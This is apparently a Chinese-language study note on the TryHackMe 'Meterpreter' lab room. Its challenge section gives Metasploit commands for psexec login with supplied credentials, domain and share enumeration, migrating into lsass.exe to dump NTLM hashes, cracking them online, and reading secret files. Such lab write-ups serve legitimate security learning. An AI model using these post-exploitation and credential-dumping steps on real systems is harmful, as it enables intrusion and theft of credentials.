> https://tryhackme.com/room/meterpreter
> #Metasploit #Offensive 
# Task 1 Introduction to Meterpreter

前置介绍

# Task 2 Meterpreter Flavors

介绍了不同环境，不同的条件下`Meterpreter`应该如何使用

# Task 3 Meterpreter Commands

介绍了`Meterpreter`内置的功能和命令

# Task 4 Post-Exploitation with Meterpreter

介绍了在`Meterpreter`中使用内置工具的情形

# Task 5 Post-Exploitation Challenge

```shell
use exploit/windows/smb/psexec
setg rhosts 10.10.168.34
set SMBuser ballen
set SMBpass Password1
```
![[Pasted image 20221216193221.png]]

获取计算机名称
```shell
sysinfo
```
![[Pasted image 20221216193255.png]]

获取目标计算机的目标域
```shell
use post/windows/gather/enum_domain
set session 2
```
![[Pasted image 20221216193426.png]]

获取当前计算机的`share`的信息
```shell
use post/windows/gather/enum_shares
setg session 2
```
![[Pasted image 20221216193527.png]]

获取当前计算机的NTLM哈希信息
首先，要想获取到NTLM哈希信息，要将`meterpreter`的进程迁移到`lsass.exe`所在pid
```shell
migrate 756
```
然后才能正常的通过`hashdump`获取到NTLM哈希信息
```shell
hashdump
```
![[Pasted image 20221216194225.png]]
而后通过在线的[彩虹表网站](https://crackstation.net/)，即可查到明文密码：
![[Pasted image 20221216194309.png]]

找到 `secrets.txt`这个文件
直接在`meterpreter`中进行搜索操作
```shell
search -f secrets.txt
```
*这个search没有进度条，让人很慌啊，不知道靶机有没有掉线*
```shell
meterpreter > search -f secrets.txt

Found 1 result...

c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)
```
然后直接`cat`就可以了
```shell
meterpreter > cat c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt

[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.

meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"

My Twitter password is KDSvbsw3849!
```

寻找`realsecret.txt`文件
同上，直接`search`就可以了
```shell
meterpreter > search -f realsecret.txt

Found 1 result...

c:\inetpub\wwwroot\realsecret.txt (34 bytes)
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"

The Flash is the fastest man alive
```

![[Pasted image 20221216195518.png]]